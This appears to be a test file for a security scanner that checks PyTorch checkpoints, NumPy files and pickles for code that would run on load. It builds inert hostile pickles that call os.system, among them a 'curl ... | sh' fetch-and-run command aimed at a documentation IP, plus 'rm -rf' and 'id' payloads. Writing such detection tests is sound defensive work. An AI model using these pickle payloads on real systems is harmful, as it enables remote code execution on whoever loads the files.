// FP-MODEL-FILES: a model file's pickles are read for what they would run, in the npm package's project scan and
// --deps, as the Python package reads them (python/tests/scanner/test_review_model_files.py; the engine's pickle/,
// through collect_file and model_own). A PyTorch checkpoint is a zip by design: it was SC-NESTED-ARCHIVE (WARN)
// while what loading it runs was never read. Inert bytes written opcode by opcode: nothing is unpickled or loaded.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, openSync, writeSync, ftruncateSync, closeSync,
  statSync } from "node:fs";
import * as zlib from "node:zlib";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";

const b = (...parts) => Buffer.concat(parts.map((p) => (typeof p === "string" ? Buffer.from(p, "latin1") : Buffer.from(p))));
const su = (s) => b([0x8c, s.length], s);                         // SHORT_BINUNICODE
const glob = (m, n) => `c${m}\n${n}\n`;                            // GLOBAL
const STOP = ".";

// torch.save's data.pkl for {"w": tensor}: _rebuild_tensor_v2 on a persistent storage
const STATE_DICT = b([0x80, 2], glob("collections", "OrderedDict"), ")R", "q\x00", su("w"),
  glob("torch._utils", "_rebuild_tensor_v2"), "((", su("storage"), glob("torch", "FloatStorage"), su("0"), su("cpu"),
  "K\x04tQ", "K\x00K\x02K\x02", [0x86], "K\x02K\x01", [0x86, 0x89], glob("collections", "OrderedDict"), ")RtRs", STOP);
const OS_SYSTEM = (cmd) => b([0x80, 2], glob("os", "system"), su(cmd), [0x85], "R", STOP);

const crc32 = (buf) => {
  let c = ~0;
  for (const x of buf) { c ^= x; for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xedb88320 & -(c & 1)); }
  return ~c >>> 0;
};
/** A zip of stored entries, as torch.save and numpy.savez write them. */
function zipOf(entries) {
  const parts = [], cd = [];
  let off = 0;
  for (const [name, body] of entries) {
    const n = Buffer.from(name), d = Buffer.from(body);
    const head = Buffer.alloc(30);
    head.writeUInt32LE(0x04034b50, 0); head.writeUInt16LE(20, 4); head.writeUInt32LE(crc32(d), 14);
    head.writeUInt32LE(d.length, 18); head.writeUInt32LE(d.length, 22); head.writeUInt16LE(n.length, 26);
    parts.push(head, n, d);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt32LE(crc32(d), 16);
    c.writeUInt32LE(d.length, 20); c.writeUInt32LE(d.length, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(off, 42);
    cd.push(c, n);
    off += 30 + n.length + d.length;
  }
  const cdBuf = Buffer.concat(cd);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdBuf.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...parts, cdBuf, end]);
}
const checkpoint = (pkl, name = "archive") => zipOf([[`${name}/data.pkl`, pkl], [`${name}/byteorder`, "little"],
  [`${name}/data/0`, Buffer.alloc(16)], [`${name}/version`, "3\n"]]);
function npy(descr, after) {
  let h = `{'descr': ${descr}, 'fortran_order': False, 'shape': (3,), }`;
  while ((10 + h.length + 1) % 64 !== 0) h += " ";
  h += "\n";
  const len = Buffer.alloc(2);
  len.writeUInt16LE(h.length);
  return b("\x93NUMPY\x01\x00", len, h, after);
}

function tree(files) {
  const d = mkdtempSync(join(tmpdir(), "lazaret-model-"));
  for (const [rel, data] of Object.entries(files)) {
    const p = join(d, ...rel.split("/"));
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, data);
  }
  return d;
}
function scan(files, extra = []) {
  const d = tree(files);
  try {
    const err = [];
    const code = run(["check", d, "-q", "--no-html", ...extra], { out: () => {}, err: (s) => err.push(s) });
    const issues = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8")).issues;
    return { code, err: err.join("\n"), issues };
  } finally { rmSync(d, { recursive: true, force: true }); }
}
const sc = (issues, prefix = "") => issues.filter((i) => i.rule.startsWith("SC-") && i.file.replaceAll("\\", "/").startsWith(prefix))
  .map((i) => [i.file.replaceAll("\\", "/"), i.rule, i.sev]).sort();

test("a checkpoint is read, not reported as an embedded archive (the false positive)", () => {
  const r = scan({ "golden/golden.pt": checkpoint(STATE_DICT, "golden"), "model.py": "import mlx\n" });
  assert.deepEqual(sc(r.issues), []);
  assert.equal(r.code, 0, r.err);
});

test("hostile pickles, in a checkpoint, a second data.pkl, an .npy and an .npz, are CRITICAL", () => {
  const r = scan({
    "bad.pt": checkpoint(OS_SYSTEM("curl -s http://192.0.2.1/a | sh")),
    "two.pt": zipOf([["a/data.pkl", STATE_DICT], ["a/version", "3\n"], ["b/data.pkl", OS_SYSTEM("id")]]),
    "o.npy": npy("'|O'", OS_SYSTEM("id")),
    "x.npz": zipOf([["w.npy", npy("'<f8'", Buffer.alloc(24))], ["o.npy", npy("'|O'", OS_SYSTEM("id"))]]),
    "sg.pkl": b([0x80, 4], su("os"), [0x94], su("system"), [0x94], "h\x00h\x01", [0x93], su("id"), [0x85], "R", STOP),
    "app.py": "x = 1\n" });
  const crit = sc(r.issues).filter(([, rule]) => rule === "SC-PICKLE-CODE").map(([f]) => f);
  assert.deepEqual([...new Set(crit)].sort(), ["bad.pt", "o.npy", "sg.pkl", "two.pt", "x.npz"]);
  assert.ok(r.issues.some((i) => i.rule === "SC-PICKLE-CODE" && i.msg.includes("b/data.pkl")));
  assert.ok(sc(r.issues).some(([f, rule]) => f === "two.pt" && rule === "SC-NESTED-ARCHIVE"));   // (a member a checkpoint has not)
});

test("benign files are quiet; a call told what to use by text is MAJOR; the project's own class is INFO", () => {
  const r = scan({
    "w.npy": npy("'<f8'", Buffer.alloc(24)),
    "hp.pkl": "(dp0\nS'lr'\np1\nF0.1\ns.",
    "run.pkl": b([0x80, 2], glob("somelib.util", "run"), su("rm -rf /tmp/x"), [0x85], "R", STOP),
    "net.pt": checkpoint(b([0x80, 2], glob("mymodel", "Net"), ")", [0x81], "}b", STOP)),
    "mymodel.py": "class Net: pass\n" });
  // (the project's own module: listed, setting no verdict, as its code is the scan's to read: John, Oct 21)
  assert.deepEqual(sc(r.issues), [["net.pt", "SC-PICKLE-GLOBAL", "INFO"], ["run.pkl", "SC-PICKLE-GLOBAL", "MAJOR"]]);
});

test("what cannot be read is SC-TRUNCATED", () => {
  const cut = OS_SYSTEM("id").subarray(0, -2);
  const r = scan({ "cut.pkl": cut, "m.pkl.bz2": b("BZh91AY&SY", Buffer.alloc(20)), "app.py": "x = 1\n" });
  assert.deepEqual(sc(r.issues).filter(([, rule]) => rule === "SC-TRUNCATED").map(([f]) => f), ["cut.pkl", "m.pkl.bz2"]);
});

test("--deps reads a dependency's model files; its own module is its own", () => {
  const sp = ".venv/lib/python3.12/site-packages";
  const files = { ".venv/pyvenv.cfg": "home = /usr/bin\n", "app.py": "import dep\n", [`${sp}/dep/__init__.py`]: "x = 1\n",
    [`${sp}/dep/model.py`]: "class M: pass\n", [`${sp}/dep/bad.pkl`]: OS_SYSTEM("id"),
    [`${sp}/dep/w.pt`]: checkpoint(b([0x80, 2], glob("dep.model", "M"), ")", [0x81], "}b", STOP)) };
  const r = scan(files, ["--deps"]);
  assert.deepEqual(sc(r.issues, ".venv/").map(([f, rule]) => [f, rule]),
    [[`${sp}/dep/bad.pkl`, "SC-PICKLE-CODE"], [`${sp}/dep/w.pt`, "SC-PICKLE-GLOBAL"]]);
  assert.deepEqual(sc(scan(files).issues, ".venv/lib"), []);
});

// ---- a checkpoint of 200 MB, read by range (John's decision of Oct 21) -------------------------------------------

/** torch.save's archive whose storages are runs of zeros of `sizes` bytes, as parts [Buffer, or a run's length]. */
function bigCheckpoint(pkl, sizes, more = []) {
  const zeros = Buffer.alloc(1 << 20);
  const crcZeros = (n) => {          // (zlib.crc32 where Node has it; the reader reads no CRC)
    if (typeof zlib.crc32 !== "function") return 0;
    let c = 0;
    for (; n > 0; n -= zeros.length) c = zlib.crc32(n >= zeros.length ? zeros : zeros.subarray(0, n), c);
    return c >>> 0;
  };
  const entries = [["archive/data.pkl", pkl], ["archive/byteorder", Buffer.from("little")],
    ...sizes.map((n, k) => [`archive/data/${k}`, n]), ...more, ["archive/version", Buffer.from("3\n")]];
  const parts = [], cd = [];
  let off = 0;
  for (const [name, body] of entries) {
    const n = Buffer.from(name), len = typeof body === "number" ? body : body.length;
    const crc = typeof body === "number" ? crcZeros(body) : crc32(body);
    const head = Buffer.alloc(30);
    head.writeUInt32LE(0x04034b50, 0); head.writeUInt16LE(20, 4); head.writeUInt32LE(crc, 14);
    head.writeUInt32LE(len, 18); head.writeUInt32LE(len, 22); head.writeUInt16LE(n.length, 26);
    parts.push(Buffer.concat([head, n]), body);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt32LE(crc, 16);
    c.writeUInt32LE(len, 20); c.writeUInt32LE(len, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(off, 42);
    cd.push(c, n);
    off += 30 + n.length + len;
  }
  const cdBuf = Buffer.concat(cd);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdBuf.length, 12); end.writeUInt32LE(off, 16);
  parts.push(Buffer.concat([cdBuf, end]));
  return parts;
}
/** The parts as a sparse file (its runs of zeros holes). */
function writeParts(path, parts) {
  mkdirSync(dirname(path), { recursive: true });
  const fd = openSync(path, "w");
  let at = 0;
  try {
    for (const p of parts) {
      if (typeof p === "number") at += p;
      else { writeSync(fd, p, 0, p.length, at); at += p.length; }
    }
    ftruncateSync(fd, at);
  } finally { closeSync(fd); }
}

test("a 200 MB checkpoint is read by range (a .pth one's lines in chunks): quiet when benign, CRITICAL when hostile, with --deps too", () => {
  const sp = ".venv/lib/python3.12/site-packages";
  const d = tree({ "app.py": "x = 1\n", ".venv/pyvenv.cfg": "home = /usr/bin\n", [`${sp}/dep/__init__.py`]: "x = 1\n" });
  try {
    const big = { "w/model.pt": bigCheckpoint(STATE_DICT, [100_000_000, 100_000_000]),
      "w/bad.pt": bigCheckpoint(OS_SYSTEM("curl -s http://192.0.2.1/a | sh"), [200_000_000]),
      "w/late.pt": bigCheckpoint(STATE_DICT, [200_000_000], [["archive/constants.pkl", OS_SYSTEM("id")]]),
      [`${sp}/dep/w.pt`]: bigCheckpoint(OS_SYSTEM("id"), [200_000_000]),
      // (.pth, PyTorch's usual name: its lines read in chunks, its pickle by range)
      "w/model.pth": bigCheckpoint(STATE_DICT, [100_000_000, 100_000_000]),
      "w/evil.pth": bigCheckpoint(STATE_DICT, [200_000_000],
        [["archive/extra/notes", Buffer.from("\nimport os; os.system('curl -s http://192.0.2.1/a | sh')\n")]]) };
    for (const [rel, parts] of Object.entries(big)) {
      writeParts(join(d, ...rel.split("/")), parts);
      assert.ok(statSync(join(d, ...rel.split("/"))).size > 200_000_000);
    }
    const t = Date.now();
    const code = run(["check", d, "-q", "--no-html", "--deps"], { out: () => {}, err: () => {} });
    const took = Date.now() - t;
    const issues = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8")).issues;
    const got = sc(issues);
    assert.deepEqual(got.filter(([f]) => f === "w/model.pt" || f === "w/model.pth"), []);
    // (a member the format has not keeps SC-NESTED-ARCHIVE beside: the external review of Oct 21)
    assert.deepEqual(got.filter(([f]) => f === "w/evil.pth").sort(), [["w/evil.pth", "SC-NESTED-ARCHIVE", "MINOR"], ["w/evil.pth", "SC-PTH-EXEC", "CRITICAL"]]);
    for (const [f, want] of [["w/bad.pt", [["SC-PICKLE-CODE", "CRITICAL"]]],
      ["w/late.pt", [["SC-NESTED-ARCHIVE", "MINOR"], ["SC-PICKLE-CODE", "CRITICAL"]]], [`${sp}/dep/w.pt`, [["SC-PICKLE-CODE", "CRITICAL"]]]]) {
      assert.deepEqual(got.filter(([g]) => g === f).map(([, rule, sev]) => [rule, sev]).sort(), want, f);
    }
    assert.ok(issues.some((i) => i.rule === "SC-PICKLE-CODE" && i.msg.includes("archive/constants.pkl")));
    assert.ok(took < 20_000, `${took} ms (exit ${code})`);
  } finally { rmSync(d, { recursive: true, force: true }); }
});
